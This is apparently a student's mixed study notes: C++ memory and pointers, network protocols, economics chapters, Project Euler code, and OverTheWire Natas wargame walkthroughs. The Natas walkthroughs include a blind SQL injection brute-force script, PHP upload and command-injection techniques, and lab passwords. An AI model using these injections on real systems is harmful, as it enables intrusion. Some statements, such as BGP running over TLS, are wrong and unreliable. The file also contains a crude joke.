<div style="break-before: page; page-break-before: always;"></div><h1 id="stack-memory-vs-heap-memory"><a class="header" href="#stack-memory-vs-heap-memory">Stack memory vs Heap memory</a></h1>
<p>Whenever a program is run, it has two kinds of memories, stack and heap.</p>
<p><img src="notes/./.assets/memory_1.png" alt="Memory layout" /></p>
<p>This describes the layout of memory when the program is run.</p>
<p>Higher memory address is read off first, then the data that was at the top of the stack is removed and the data below it is read.</p>
<p>Think of stack like a pile of dishes. To take a plate, sane people would pick up one from the top of the pile. Then the next one is picked, and so on.</p>
<p>Stack contains both function calls and local variables. Heap contains only variables.</p>
<p>BSS and data segments are not relevant, but they contain the global uninitialized and initialized data respectively.</p>
<p>Heap has a large amount of memory. More than stack. And most heap allocated things are freely resizable. However, the access to heap is significantly slower, and the elements may not be stored in a continuous fashion.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="natas_levels"><a class="header" href="#natas_levels">natas_levels</a></h1>
<h2 id="level-0"><a class="header" href="#level-0">Level 0</a></h2>
<p>Password is in the comments.</p>
<h2 id="level-1"><a class="header" href="#level-1">Level 1</a></h2>
<p>Open inspect element through keyboard shortcut and remove the oncontextmenu line from the body tag.</p>
<h2 id="level-2"><a class="header" href="#level-2">Level 2</a></h2>
<p>When you view the source it shows a <code>files/pixel.png</code> element present on the page. That implies that there is a <code>file</code> folder in the server directory. Open the folder and see the file contents.</p>
<h2 id="level-3"><a class="header" href="#level-3">Level 3</a></h2>
<p>Open <code>robots.txt</code> and see the disallowed folder. This is checked by web crawlers to see what folders to <em>not</em> index.</p>
<h2 id="level-4"><a class="header" href="#level-4">Level 4</a></h2>
<p>Change referer by setting up a proxy to localhost and then using mitmproxy.</p>
<h2 id="level-5"><a class="header" href="#level-5">Level 5</a></h2>
<p>Change cookie by setting up localhost proxy and using mitmproxy.</p>
<h2 id="level-6"><a class="header" href="#level-6">Level 6</a></h2>
<p>The PHP sauce has the file that has the secret word necessary for revealing the password.</p>
<h2 id="level-7"><a class="header" href="#level-7">Level 7</a></h2>
<p>Check the HTML. It has a comment stating the page that has the password. Use that as a query in the URL to view the page.</p>
<h2 id="level-8"><a class="header" href="#level-8">Level 8</a></h2>
<p>Check the PHP source they are providing. Obtain the string from the hexadecimal, reverse it, and do a <code>base64</code> decode on it.</p>
<h2 id="level-9"><a class="header" href="#level-9">Level 9</a></h2>
<p>Comment out the query and grep the file that has the password since the input goes unsantized to passthru.</p>
<h2 id="level-10"><a class="header" href="#level-10">Level 10</a></h2>
<p>Do the same as before. Asterisk, period and forward slashes are not there in the filtered characters.</p>
<h2 id="level-11"><a class="header" href="#level-11">Level 11</a></h2>
<p><code>base64</code> decode the data cookie. XOR it with the given cookie to obtain the XOR key. Once the key is obtained use it to change the cookie value to yes and encrypt it. Then send that as the cookie.</p>
<h2 id="level-12"><a class="header" href="#level-12">Level 12</a></h2>
<p>Create a <code>.php</code> file to cat the password. Change the html to send a php through the form instead of a jpg. Send it and open it in the browser.</p>
<h2 id="level-13"><a class="header" href="#level-13">Level 13</a></h2>
<p>Add the JPEG magic bytes to the raw hexdump of the file. Then upload it.</p>
<h2 id="level-14"><a class="header" href="#level-14">Level 14</a></h2>
<p>Comment out the sql query ahead of the username.</p>
<h2 id="level-15"><a class="header" href="#level-15">Level 15</a></h2>
<pre><code class="language-py">#!/bin/python
import requests,string

url = "http://natas15.natas.labs.overthewire.org"
auth_username = "natas15"
auth_password = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"

characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

password = ''

iter = 1

while(True):
    for i in characters:
        uri = url + "?debug=true"
        r = requests.get(uri, auth = (auth_username,auth_password), params = {'username':'natas16" and BINARY SUBSTR(password, 1, ' + str(iter) + ')="' + password + i})
        # print(r.text)
        if "This user exists" in r.text:
            iter += 1
            password += i
            print(password)
</code></pre>
<p>A <code>post</code> method can also be used for this.</p>
<p>natas 8: a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
natas 11: 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
natas 12: YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG</p>
<p>natas 14: qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP</p>
<p>natas 16: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="network_stack"><a class="header" href="#network_stack">network_stack</a></h1>
<ul>
<li>Just a list of protocols that you need to satisfy in order to be able to use connections.</li>
</ul>
<h2 id="ip"><a class="header" href="#ip">IP</a></h2>
<ul>
<li>Has a header that contains source IP, destination IP, and other metadata that tells the next protocol as to where to send the data to.</li>
<li>The payload contains the actual meaningful message for the next protocol.</li>
<li>Has two categories- IPv4 and IPv6.</li>
<li><a href="notes/ipv4.html">ipv4</a> is a legacy mapping system. Has 32 bit addresses. Got exhausted lol.</li>
<li><a href="notes/ipv6.html">ipv6</a> is the new network system. Hasn’t been completely destroyed.</li>
</ul>
<h2 id="bgp"><a class="header" href="#bgp">BGP</a></h2>
<ul>
<li>BGP stands for Border Gateway Protocol. It is a routing protocol used by Internet Service Providers (ISPs) to exchange information about the paths that data packets should take to reach their destination on the internet.</li>
<li>Has underlying TLS for communication.</li>
<li>Used to communicate between two autonomous systems.</li>
<li>Keeps sending 19 byte keep-alive messages to peers every 30 seconds (changeable) from port 179.</li>
<li>The peers are pre-configured in the router.</li>
</ul>
<h2 id="udp-unsolicited-dick-pics"><a class="header" href="#udp-unsolicited-dick-pics">UDP (Unsolicited Dick Pics)</a></h2>
<ul>
<li>Used for real time communication like VoIP and online gaming.</li>
<li>Header contains Source port number (16 bits), destination port number (16 bits), length (16 bits) and the checksum (16 bits).</li>
<li>The IPv4 pseudo header contains source address (32 bits), destination address (32 bits), zero padding (8 bits), protocol number (17 for UDP), UDP Length of the underlying message, and to this the UDP header is appended.</li>
<li>The IPv6 pseudo header contains source address (128 bits), destination address (128 bits), UDP length (32 bits), zero padding (24 bits), protocol number (8 bits, 17 for UDP), followed by the appended UDP header.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ch-1-ten-principles-of-economics"><a class="header" href="#ch-1-ten-principles-of-economics">Ch 1: Ten Principles of Economics</a></h1>
<ul>
<li>Scarcity: Limited Nature of society’s resources.</li>
<li>Economics: The study of how society manages its scarce resources</li>
</ul>
<h2 id="what-do-economists-study-about"><a class="header" href="#what-do-economists-study-about">What do Economists study about?</a></h2>
<ol>
<li>How people make decisions: how much they work, what they buy, how much they save,
and how they invest their savings.</li>
<li>How people interact with one another</li>
<li>Analyze the forces and trends that affect the economy as a whole, including the growth in average income, the fraction of the population that cannot find work, and the rate at which prices are rising.</li>
</ol>
<p>There are 10 principles of economics, out of which first 4 are about individual decision-making.</p>
<h3 id="how-people-make-decisions"><a class="header" href="#how-people-make-decisions">How People Make Decisions</a></h3>
<ol>
<li>People face Trade-offs
To get something that we like we must give up something else that we also like, making decisions requires trading off one goal against another. When people are grouped into societies, they face trade-offs there too.</li>
</ol>
<p>Imp example:</p>
<ul>
<li>“guns and butter”</li>
<li>Clean Environment vs Level of Income</li>
<li>Efficiency vs Equality:
<ul>
<li>Efficiency: The property of society getting the most it can from its scarce resources.</li>
<li>Equality: The property of distributing economic prosperity uniformly among the members of society.</li>
</ul>
</li>
</ul>
<ol start="2">
<li>The cost of something is what you give up to get it. Thus while making decisions people must compare costs and benefits.</li>
</ol>
<p>Opportunity Cost: Whatever must be given up to obtain some item.</p>
<ol start="3">
<li>Rational People think at the Margin</li>
</ol>
<ul>
<li>Rational People: people who systematically and purposefully do the best they can to achieve their objectives, given the available opportunities.</li>
<li>Marginal Change: a small incremental adjustment to a plan of action.</li>
</ul>
<p>Rational people often make decisions by comparing marginal benefits and marginal costs. We shouldn’t consider average costs but marginal costs.</p>
<ol start="4">
<li>People respond to incentives</li>
</ol>
<ul>
<li>Incentive: Something that induces a person to act.</li>
<li>Incentives are the key to analysing how markets work.</li>
<li>Higher prices is an incentive for buyers to buy less and producers to produce more.</li>
<li>Public policymakers need to consider how their policies affect incentives.</li>
<li>The US congress introduced a seat-belt law, but that just gave incentive to people to drive rashly.</li>
</ul>
<p>The next 3 decisions are about how people interact with one another.</p>
<h3 id="how-people-interact"><a class="header" href="#how-people-interact">How People Interact</a></h3>
<ol start="5">
<li>Trade can make everyone better off</li>
</ol>
<ul>
<li>Trade between two countries can make each of those countries better off.</li>
<li>Trade allows each person to specialize in the activities she does best.</li>
<li>By trading with others, people can buy a greater variety of goods and services at lower
cost.</li>
</ul>
<ol start="6">
<li>Markets are usually a good way to Organize Economic Activity</li>
</ol>
<ul>
<li>Centrally Planned Economies: The government decides what goods and services are produced, how much is produced and who produces and consumes these goods and services. The idea behind central planning is that the government can organize economic activity in a way that it promotes economic well-being for the country as a whole.</li>
<li>Most countries that were centrally planned economies have abandoned the system.</li>
<li>Many countries are developing market economies.</li>
<li>Market Economy: An economy that allocates resources through the decentralized decisions of many firms and households as they interact in markets for goods and services.</li>
<li>Firms decide who to hire and what to make</li>
<li>Households decide which firms to work for and what to buy with their incomes</li>
<li>Firms and households interact in the marketplace, where prices and self-interest guide their decisions.</li>
<li>Central planners lacked the necessary information about consumer’s tastes and producers costs which in a market economy reflects in prices.</li>
</ul>
<ol start="7">
<li>Governments can sometimes improve market outcomes</li>
</ol>
<p>Why do we need the government when we have the invisible hand of the market?</p>
<p>Cause the government needs to enforce rules and maintain the institutions that are key to the market economy.</p>
<ul>
<li>
<p>Property Rights: The ability of an individual to own and exercise control over scarce resources.</p>
</li>
<li>
<p>Property rights are enforced by the government, they let individuals to own and control their own scare resources.</p>
</li>
<li>
<p>The government needs to enforce our rights over things we produce and the invisible hand relies on our ability to enforce those rights.</p>
</li>
<li>
<p>The government generally intervenes only when it is to promote efficiency or promote equality</p>
</li>
<li>
<p>Market Failure: The situation where a market left on its own fails to allocate resources efficiently.</p>
</li>
<li>
<p>Externality: The impact of one person’s actions on the well-being of a bystander.</p>
</li>
<li>
<p>Externality example: Pollution</p>
</li>
<li>
<p>Market Power: The ability of a single person or firm (economic actor) to have unduly influence on market prices.</p>
</li>
</ul>
<p>Market Failure can happen due to market powers and externalities. In such a situation a well-designed public policy can enhance economic efficiency. The invisible hand does not ensure equality, this requires government intervention.</p>
<h3 id="how-the-economy-as-a-whole-works"><a class="header" href="#how-the-economy-as-a-whole-works">How the Economy as a Whole Works</a></h3>
<ol start="8">
<li>A country’s standard of living depends on its ability to produce goods and services.</li>
</ol>
<ul>
<li>Productivity: The quantity of goods and services produced from each unit of labor input.
Standard of living (avg income) <data class="katex-src" value=" \propto "><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∝</mo></mrow><annotation encoding="application/x-tex"> \propto </annotation></semantics></math></span></data> Productivity</li>
</ul>
<ol start="9">
<li>Prices Rise when the government prints too much money</li>
</ol>
<ul>
<li>Inflation: An increase in the overall level of prices in the economy.</li>
<li>Keeping inflation at a low level is a goal of economic policymakers around the world.</li>
<li>Most cases of large or persistent inflation is due to the growth in quantity of money.</li>
<li>When the govt prints a lot of money the value of money falls.</li>
</ul>
<ol start="10">
<li>Society Faces a Short-Run Trade-off between Inflation and
Unemployment</li>
</ol>
<p>Short Run Effects of Monetary Injections:</p>
<ul>
<li>Increase in overall spending and demand for goods and services.</li>
<li>Higher demand may encourage firms to hire more workers and produce larger
quantities.</li>
<li>More hiring means lower unemployment</li>
<li>Business Cycle: Fluctuations in economic activity such as employment and production.</li>
</ul>
<h1 id="ch2-thinking-like-an-economist"><a class="header" href="#ch2-thinking-like-an-economist">Ch2: Thinking like an Economist</a></h1>
<h2 id="terms-that-economists-use"><a class="header" href="#terms-that-economists-use">Terms that economists use:</a></h2>
<p>Supply, demand, elasticity, comparative advantage, consumer surplus, dead-weight loss, etc.</p>
<h2 id="the-economist-as-scientist"><a class="header" href="#the-economist-as-scientist">The Economist as Scientist:</a></h2>
<p>Economists devise theories, collect data and analyse the data in an attempt to verify or refute
theories.</p>
<ol>
<li>The Scientific Method: Observation, Theory and more Observation</li>
</ol>
<ul>
<li>Economist’s use theory and observation like other scientists, but conducting experiments in economics is often impractical.</li>
<li>We have to thus make do with whatever data is available. Natural experiments are offered by history. Eg: depressions, wars, etc</li>
</ul>
<ol start="2">
<li>The Role of Assumptions</li>
</ol>
<ul>
<li>Assumptions simplify the complex world, make it easier to understand.</li>
<li>Different assumptions are made based on the field of study.</li>
<li>Assumptions should not affect the answers too much</li>
</ul>
<ol start="3">
<li>Economic Models</li>
</ol>
<ul>
<li>
<p>Economist’s use models to learn about the world. These models mostly consist of diagrams and equations.</p>
</li>
<li>
<p>Economic models omit many details to allow us to see what is truly important.</p>
</li>
<li>
<p>Our First Model: The Circular-Flow Diagram</p>
<ul>
<li>In this world, millions of people are engaged in so many activities</li>
<li>To understand this we need a model that explains how the economy is organized and how participants in the economy interact with one another.</li>
<li>Circular Flow Diagram: A visual model of the economy that shows how money flow through markets among households and firms.</li>
<li>In this model the economy is simplified to include only two types of decision makers: Firms and Households</li>
<li>Factors of Production: Inputs such as labor, land and capital (buildings and machines).</li>
<li>Firms produce goods and services using the factors of production. Households own the factors of production and consume the goods and services that firms produce.</li>
<li>Households and Firms interact in two types of markets:</li>
</ul>
<ol>
<li>Markets for Goods and Services: households are buyers and firms are sellers</li>
<li>Markets for Factors of Production: households are sellers and firm buyers</li>
</ol>
<ul>
<li>There are two loops in the circular flow diagram, these are distinct but related:</li>
</ul>
<ol>
<li>The inner loop represents the flow of inputs and outputs</li>
<li>The outer loop of the diagram represents the flow of the corresponding money</li>
</ol>
</li>
</ul>
<p><img src="notes/./poe/ps_20231108095849.png" alt="Circular Flow Model" /></p>
<ul>
<li>
<p>Second Model: The Production Possibilities Frontier</p>
<ul>
<li>Most economic models use mathematics unlike the circular flow model.</li>
<li>Let us consider an economy that only produces two goods, cars and computers.</li>
<li>Thus the car and computer industry use up all the available factors of production.</li>
<li>Production Possibilities Frontier (PPF): A graph that shows the combinations of the output that the economy can possibly produce given the available factors of production and the available technology.
<img src="notes/./poe/ps_20231108101335.png" alt="Production Possibilities Frontier" /></li>
<li>Extreme possibilities: end points of the PPF</li>
<li>Because the resources are scarce, not every conceivable outcome is feasible</li>
<li>The economy can produce any combinations inside or on the frontier. Any point outside is not feasible given the economy’s resources.</li>
<li>The outcome is said to be efficient if the economy is getting all it can from the scarce resources it has available. Points on the PPF represent efficient levels of production.</li>
<li>Once we have reached an efficient point on the frontier, the only way to produce more of a good is to produce less of another: Face Trade-Offs.</li>
<li>The opportunity cost of a car is the slope of the PPF.</li>
<li>When an economy grows, society can move production from a point on the old frontier to a point on the new frontier.</li>
</ul>
<p><img src="notes/./poe/ps_20231108101722.png" alt="Shifting Frontiers" /></p>
<ul>
<li>Ideas put forward by PPF: scarcity, efficiency, trade-offs, opportunity cost, economic growth.</li>
</ul>
</li>
</ul>
<ol start="4">
<li>Microeconomics and Macroeconomics</li>
</ol>
<ul>
<li>Microeconomics: The study of how households and firms make decisions and how they interact in markets.</li>
<li>Macroeconomics: The study of economy-wide phenomena including inflations, unemployment and economic growth.</li>
<li>Changes in the overall economy arise from the decisions of millions of individuals,thus we need to consider associated microeconomic decisions to understand macroeconomic developments.</li>
</ul>
<h2 id="the-economist-as-policy-advisor"><a class="header" href="#the-economist-as-policy-advisor">The Economist as Policy Advisor</a></h2>
<p>Economists are scientists when they are trying to explain the world. When they are trying to improve the world, they are policy advisors.</p>
<h3 id="positive-versus-normative-analysis"><a class="header" href="#positive-versus-normative-analysis">Positive versus Normative Analysis</a></h3>
<ul>
<li>Positive Statements: They are descriptive, they make a claim about how the world is.</li>
<li>Normative Statements: They are prescriptive, they make a claim about how the world ought to be.</li>
<li>We can confirm positive statements by examining evidence and analysing data alone.</li>
<li>Normative statements cannot be judged using data alone, we need to look into ethics, religion and political philosophy.</li>
<li>Positive views affect normative views.</li>
</ul>
<h3 id="economists-in-washington"><a class="header" href="#economists-in-washington">Economists in Washington</a></h3>
<ul>
<li>The presidents of US have a Council of Economic Advisers.</li>
<li>They write an annual economic report of the president</li>
</ul>
<h3 id="why-economists-advice-is-not-always-followed"><a class="header" href="#why-economists-advice-is-not-always-followed">Why Economists’ advice is not always followed</a></h3>
<ul>
<li>Economists put forward the best policy in their perspective, but the president has other advisers for input as well.</li>
</ul>
<h3 id="why-economists-disagree"><a class="header" href="#why-economists-disagree">Why Economists Disagree</a></h3>
<p>Economists often disagree, this could be because:</p>
<ul>
<li>They may disagree about the positive theories.</li>
<li>They may have different values,therefore different normative views about policies.</li>
<li>Differences in Scientific Judgements. Economists may disagree about the validity of alternative theories or about the size of imp parameters that measure how economic variables are related. Eg : Tax on income or spending</li>
<li>Difference in Values. Normative analysis cannot be done on scientific grounds only, economists who have different values may give conflicting advice.</li>
<li>Perception versus Reality. Many economic policies aren’t executed due to political obstacles.</li>
</ul>
<h1 id="ch3-interdependence-and-the-gains-from-trade"><a class="header" href="#ch3-interdependence-and-the-gains-from-trade">Ch3: Interdependence and the Gains from Trade</a></h1>
<p>What exactly do people gain from trade? Why do people choose to be interdependent?</p>
<h2 id="a-parable-for-the-modern-economy"><a class="header" href="#a-parable-for-the-modern-economy">A Parable for the Modern Economy</a></h2>
<ol>
<li>Production Possibilities</li>
</ol>
<p>There is also a consumption possibilities frontier, this production possibilities frontier.</p>
<ol start="2">
<li>Specialization and Trade</li>
</ol>
<p>Trade allows everyone to pursue what they specialize in and thus makes everyone better off.</p>
<h2 id="comparative-advantage-the-driving-force-of-specialization"><a class="header" href="#comparative-advantage-the-driving-force-of-specialization">Comparative Advantage: The driving force of specialization.</a></h2>
<ol>
<li>
<p>Absolute Advantage</p>
<p>The ability to produce a good using fewer inputs than another producer.</p>
</li>
<li>
<p>Opportunity Cost and Comparative Advantage</p>
<p>The ability to produce a good at a lower opportunity cost than another producer. A producer who gives up less of other goods to produce a good X has a smaller opportunity cost of producing Good X and is said to have a comparative advantage producing it. It is possible for one person to have absolute advantage in both goods. It is impossible for one person to have comparative advantage in both goods, because the opportunity cost of one good is the inverse of the other, so if a person’s opportunity cause for one good is relatively high, it will be relatively low for the other good. So one person will have a comparative advantage producing one good, the other will in producing the other good.</p>
</li>
<li>
<p>Comparative Advantage and Trade</p>
<p>Gains from trade are based on comparative advantage. When each person specializes in producing the good for which he or she has a comparative advantage, total production in the economy rises. Increase in size of economic pie. Trade benefits all parties as they obtain a good at a price lower than their opportunity cost. Trade can benefit everyone in society because it allows people to specialize in activities in which they have a comparative advantage. 4. The Price of the Trade
For both parties to gain from trade, the price at which they trade must be in between the two opportunity costs.</p>
</li>
<li>
<p>Applications of Comparative Advantage</p>
<p>Populations of countries can also benefit from trade and specialization.</p>
<ul>
<li>Imports: Goods produced abroad and sold domestically</li>
<li>Exports: Goods produced domestically and sold abroad</li>
</ul>
<p>International trade can make individuals worse off even if it makes the country as a whole better off.</p>
</li>
</ol>
<h1 id="ch4-market-forces-of-supply-and-demand"><a class="header" href="#ch4-market-forces-of-supply-and-demand">Ch4: Market Forces of Supply and Demand</a></h1>
<p>Supply and demand are the forces that make the market economies work.</p>
<h2 id="markets-and-competition"><a class="header" href="#markets-and-competition">Markets and Competition</a></h2>
<ol>
<li>
<p>Market:</p>
<p>A group of buyers and sellers of a particular good or service.
Buyers as a group determine the demand of the product, and sellers as a group determine the supply of the product.</p>
</li>
<li>
<p>Competitive Market:</p>
<p>A market in which there are so many buyers and many sellers that each has a negligible impact on the market price.</p>
</li>
<li>
<p>Perfectly competitive market:</p>
<ul>
<li>All goods offered for sale are exactly the same</li>
<li>The buyers and sellers are so numerous, that no single buyer or seller has any influence on the market price.</li>
</ul>
<p>In a perfectly competitive market the buyers and sellers are called price takers, as they have to accept the price that the market determines.</p>
</li>
<li>
<p>Monopoly:</p>
<p>A seller who is the sole one in his market and can set the price himself.</p>
</li>
</ol>
<h2 id="demand"><a class="header" href="#demand">Demand</a></h2>
<p>Behaviour of buyers.</p>
<ol>
<li>
<p>The Demand Curve: The Relationship between Price and Quantity Demanded</p>
<ul>
<li>Quantity Demanded: The amount of a good that buyers are willing and able to purchase</li>
<li>Law of Demand: Other things being equal, the quantity demanded for a good falls when the price of the good rises and vice versa</li>
<li>Demand Schedule: A table that shows the relationship between the price of the good and the quantity demanded, holding everything else constant.</li>
<li>Demand curves: Graph of the relationship between the price of a good and the quantity demanded.</li>
<li>The demand curve slopes downwards, because as the prices fall the demand increases.</li>
</ul>
</li>
<li>
<p>Market Demand vs Individual Demand</p>
<ul>
<li>Individual demand is shown by the demand curve</li>
<li>The market demand is the sum of all the individual demands for a particular good or service.</li>
<li>The market demand curve shows how the total quant</li>
</ul>
</li>
<li>
<p>Shifts in the Demand Curve</p>
<ul>
<li>
<p>Increase in demand: shifts the demand to the right</p>
</li>
<li>
<p>Decrease in demand: shifts the demand to the left</p>
</li>
<li>
<p>Variables that shift demand curve:</p>
<ol>
<li>
<p>Income</p>
<ul>
<li>Normal Good: A good for which other things being equal, an increase in income leads to an increase in demand.</li>
<li>Inferior Good: A good for which , other things being equal an increase in income leads to a decrease in demand.</li>
</ul>
</li>
<li>
<p>Price of Related Goods</p>
<ul>
<li>Substitutes: Two goods for which an increase in price of one leads to an increase in demand for the other.</li>
<li>Complements: Two goods for which an increase in price of one leads to a decrease in demand for the other.</li>
</ul>
</li>
<li>
<p>Tastes</p>
</li>
<li>
<p>Expectations</p>
</li>
<li>
<p>Number of Buyers: As the number of buyers in a market increase, the market demand would also increase.</p>
</li>
</ol>
</li>
</ul>
</li>
</ol>
<p><img src="notes/./poe/dem_curve.png" alt="Demand Curve" />
<img src="notes/./poe/dem_table.png" alt="How demand curves are influenced" /></p>
<h2 id="supply"><a class="header" href="#supply">Supply</a></h2>
<p>Behaviour of producers/sellers.</p>
<ol>
<li>
<p>The Supply Curve: The Relationship between Price and Quantity Supplied</p>
<ul>
<li>Quantity Supplied: The amount of a good that sellers are willing and able to sell</li>
<li>Law of Supply: Other things being equal, the quantity supplied of a good rises when the price of a good rises.</li>
<li>Supply Schedule: A table that shows the relationship between the price of a good and the quantity supplied.</li>
<li>Supply Curve: A graph of the relationship between the price of a good and the quantity supplied.</li>
<li>The slope of the supply curve is positive, other things being equal, a higher price means a greater quantity supplied.</li>
</ul>
</li>
<li>
<p>Market Supply versus Individual Supply</p>
<ul>
<li>Market Supply: It is the sum of all the individual supplies</li>
</ul>
</li>
<li>
<p>Shifts in the Supply Curve</p>
<ul>
<li>
<p>Increase in supply: Shifts supply curve to the right</p>
</li>
<li>
<p>Decrease in supply: Shifts the supply curve to the left</p>
</li>
<li>
<p>Variables that shift supply:</p>
<ol>
<li>Input Prices: If input prices rise, the supply goes down.</li>
<li>Technology: Advance in technology raises the supply</li>
<li>Expectations: If the prices are expected to rise, then some of the goods can be kept in storage and supply temporarily goes down.</li>
<li>Number of Sellers: More the sellers more the market supply</li>
</ol>
</li>
</ul>
</li>
</ol>
<p><img src="notes/./poe/sup_curve.png" alt="supply curve" />
<img src="notes/./poe/sup_table.png" alt="factors affecting supply" /></p>
<h2 id="supply-and-demand-together"><a class="header" href="#supply-and-demand-together">Supply and Demand together</a></h2>
<ol>
<li>
<p>Equilibrium</p>
<ul>
<li>Equilibrium: A situation in which the market price has reached the level at which quantity supplied equals quantity demanded. The corresponding price and quantity is called the equilibrium price and quantity.</li>
<li>Equilibrium Price: The price that balances quantity supplied and quantity demanded. Equilibrium price is sometimes called the market clearing price, because at this price everyone is satisfied.</li>
<li>Equilibrium Quantity: The quantity supplied = quantity demanded at equilibrium.</li>
<li>The actions of buyers and sellers naturally move the markets towards the equilibrium of supply and demand.</li>
<li>Surplus: A situation in which the quantity supplied is greater than quantity demanded. (Excess supply) There is thus an downward pressure on price.</li>
<li>Shortage: A situation where the quantity demanded is greater than the quantity supplied. (Excess demand). There is thus an upward pressure on price.</li>
<li>In most markets surpluses and shortages are temporary.</li>
</ul>
</li>
</ol>
<blockquote>
<p><strong>Law of Supply and Demand</strong>: The claim that the price of any good adjusts to bring the quantity supplied and the quantity demanded for that good into balance.</p>
</blockquote>
<ol start="2">
<li>Three Steps to Analysing Changes in Equilibrium
When the supply or demand curves shift, the equilibrium in the market changes. The following steps need to be followed:
<ul>
<li>Change in supply → Shift of curve</li>
<li>Change in quantity supplied → Movement along curve</li>
<li>Change in demand → Shift of curve</li>
<li>Change in quantity demanded → Movement along curve</li>
<li>If Demand increases: P increases and Q increases</li>
<li>If supply decreases: P increases, Q decreases</li>
</ul>
</li>
</ol>
<blockquote>
<p>If an invisible hand guides market economies, as Adam Smith famously suggested, then the price system is the baton that the invisible hand uses to conduct the economic orchestra</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h1 id="pointers-scoping"><a class="header" href="#pointers-scoping">Pointers, Scoping</a></h1>
<p>A pointer is nothing but a block of memory that stores the address of another block of memory. It can be an array, a class, an integer, or even a function.</p>
<p>For a variable of type <code>T</code>, <code>T*</code> is the  type  <code>pointer to T</code>.</p>
<pre><code class="language-cpp">char p = 'c';

char* ptr = &amp;p;
</code></pre>
<p>Here, ptr holds the address of c, <code>&amp;</code> is the address-of operator.</p>
<h2 id="how-pointers-work"><a class="header" href="#how-pointers-work">How Pointers work</a></h2>
<pre><code class="language-cpp">int var = 10;

int *ptr = &amp;var; // A pointer that points to an integer value
*ptr = 20; // dereferencing that pointer gives us access to the underlying value

int **pptr = &amp;ptr; // A pointer that points to an integer pointer
**pptr = 30; // double dereferencing works the same way as single dereferencing
</code></pre>
<h2 id="why-pointers-are-necessary---scoping-explained"><a class="header" href="#why-pointers-are-necessary---scoping-explained">Why pointers are necessary - Scoping Explained</a></h2>
<p>Suppose we have the following block of code:</p>
<pre><code class="language-cpp">void add(int x, int y) {
x = x + y;
}

int main(){
int a = 10;
int b = 30;
add(a, b);
std::cout &lt;&lt; a &lt;&lt; '\n';
}
</code></pre>
<p>You’d expect the output to be <code>40</code> right? Wrong! But why though? Enter scoping.</p>
<p>When we write <code>add(a, b)</code>, what the compiler internally does is that it creates a copy of the variables <code>a</code> and <code>b</code> for the use within the function <code>add</code>. Now the <strong>scope</strong> of the new variables, now referred to as the <em>copies</em> of the original variables is the function block, i.e., the copies exist only temporarily till the function block is being executed.</p>
<p>Once the function block is over, the copies are discarded. Hence the value of <em>40</em> that was asssigned to the <em>copy</em> of <code>a</code> vanishes, and <code>a</code> itself retains the value it had.</p>
<p>This is the scope of a function. There can be self-made scopes too.</p>
<pre><code class="language-cpp">int main(){
int a = 30;
// uncommenting the below line will be an error. A variable with one name will be declared twice in the same scope
// int a = 40;

{// beginning of a new scope.
int a = 40;
//here variables can be redeclared
}

}
</code></pre>
<p>Now to access the outer variable <code>a</code> in the inner scope you can again use a pointer that points to <code>a</code>.</p>
<pre><code class="language-cpp">int main(){
int a = 30;
int *aptr = &amp;a;

{
int a = 40;// redeclaring a inside
a = 60; // doesn't change the value of the a in outer scope
*aptr = 50; // changes the value of a in outer scope
}

}
</code></pre>
<h2 id="arrays-are-pointers"><a class="header" href="#arrays-are-pointers">Arrays are pointers</a></h2>
<p>Arrays are nothing but pointers with a large range of access. We can also utilise arrays as pointers.</p>
<pre><code class="language-cpp">int main(){
int array[] = {1, 3, 4, 6};
cout &lt;&lt; *(array + 1) &lt;&lt; '\n';
// prints 3
}
</code></pre>
<h3 id="dynamically-allocated-arrays"><a class="header" href="#dynamically-allocated-arrays">Dynamically allocated arrays</a></h3>
<p>For arrays that reside on heap memory, you can allocate the arrays as follows. Note that they are declared using pointers only.</p>
<pre><code class="language-cpp">
int main(){

int *array = new int[10];

for (int i = 0; i &lt; 10; i++) 
    *(array + i) = 10i; // can also use array[i] here, it will work 

cout &lt;&lt; array[9] &lt;&lt; '\n';
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="project_euler"><a class="header" href="#project_euler">project_euler</a></h1>
<p>#12.py</p>
<pre><code class="language-py">from math import sqrt,floor

def main():
    i = 1
    while True:
        yield i*(i+1)//2
        i += 1

def count(x):
    count = 0
    if sqrt(x) == float(floor(sqrt(x))):
        for i in range(1,int(sqrt(x))):
            if x%i == 0:
                count += 2
        count += 1
        return count
    else:
        for i in range(1,int(sqrt(x))):
            if x%i == 0:
                count += 2
        return count

for i in main():
    if count(i) &gt; 500:
        print(i)
        break
</code></pre>
<p>#14.py</p>
<pre><code class="language-py">count = 0
def collatz(n):
    global count
    if n == 1:
        var = count
        count = 0
        return var
    elif n%2 == 0:
        count += 1
        return collatz(n//2)
    else:
        count += 1
        return collatz(3*n+1)


var = [3,collatz(3)]
for i in range(1,10**6):
    if collatz(i) &gt; var[1]:
        var = [i,collatz(i)]
    else:
        continue

print(var)
</code></pre>
<p>#15.py</p>
<pre><code class="language-py">def path(x,y):
    if x == 0 and y == 0:
        return 0
    elif x == 0 and y != 0:
        return y
    elif y == 0 and x != 0:
        return x
    else:
        return path(x-1,y) + path(x,y-1)

print(path(20,20))

##from math import comb
##print(comb(40,20))
</code></pre>
<p>#16.py</p>
<pre><code class="language-py">a = 2**10
for i in range(0,2):
   a = a**10
sum = 0
for i in str(a):
    sum += int(i)

print(sum)
</code></pre>
<p>#17.py</p>
<pre><code class="language-py">dict1 = { 0:'', 1:'one', 2:'two', 3:'three', 4:'four', 5:'five', 6:'six', 7:'seven', 8:'eight', 9:'nine'}
dict2 = { 0:'', 2:'twenty', 3:'thirty', 4:'forty', 5:'fifty', 6:'sixty', 7:'seventy', 8:'eighty', 9:'ninety'}
dict3 = { 10:'ten', 11:'eleven', 12:'twelve', 13:'thirteen', 14:'fourteen', 15:'fifteen', 16:'sixteen', 17:'seventeen', 18:'eighteen',19:'nineteen'}

def l(number):
